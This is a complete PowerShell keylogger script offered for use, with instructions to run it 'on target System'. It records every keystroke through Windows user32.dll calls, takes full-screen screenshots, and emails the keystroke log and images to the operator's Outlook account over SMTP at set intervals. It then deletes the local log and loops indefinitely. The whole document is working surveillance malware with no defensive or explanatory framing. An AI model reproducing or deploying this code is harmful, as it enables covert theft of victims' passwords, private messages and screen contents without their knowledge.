
<#
============================================= Key Record Script ========================================================

SYNOPSIS
This script gathers Keypress information and sends an email to a desired address with the results.

WARNINGS
This script Uses smtp Email and requires an OUTLOOK/HOTMAIL Email address to be able to send Emails as
most other email providers use other protocols.

USAGE
1. Input your credentials below (Hotmail/Outlook ONLY)
2. Run Script on target System
3. Check Email for results

#>

Do{
#===================== INPUT CREDENTIALS HERE =====================
$FromTo = "YOUR_EMAIL"
$Pass = "YOUR_PASSWORD"

$RunTimeP = 10 # Interval (in minutes) between each email
#==================================================================

$TimesToRun = 1
$Subject = "$env:COMPUTERNAME : : Keylogger Results"
$body = "$env:COMPUTERNAME : Keylogger Results : $TimeStart"
$SMTPServer = "smtp.outlook.com"
$SMTPPort = "587"
$credentials = new-object Management.Automation.PSCredential $FromTo, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
$TimeStart = Get-Date
$TimeEnd = $timeStart.addminutes($RunTimeP)

function Start-Key($Path="$env:temp\logtype.txt") 
{ 
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru  
  $null = New-Item -Path $Path -ItemType File -Force
  try{
    $Runner = 0
	while ($TimesToRun  -ge $Runner) {                              
	while ($TimeEnd -ge $TimeNow) {
      Start-Sleep -Milliseconds 30
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $mychar = New-Object -TypeName System.Text.StringBuilder
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
          if ($success) {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
          }
        }
      }
	  $TimeNow = Get-Date
    }
    $Filett = "$env:temp\SC.png"
    Add-Type -AssemblyName System.Windows.Forms
    Add-type -AssemblyName System.Drawing
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)

    Start-Sleep 3
	send-mailmessage -from $FromTo -to $FromTo -subject $Subject -body $body -Attachment $Path,$filett -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
	Remove-Item -Path $Path -force
	}
  }
  finally
  {
	$null = New-Item -Path $Path -ItemType File -Force
  }
}
Start-Key
}While ($a -le 5)
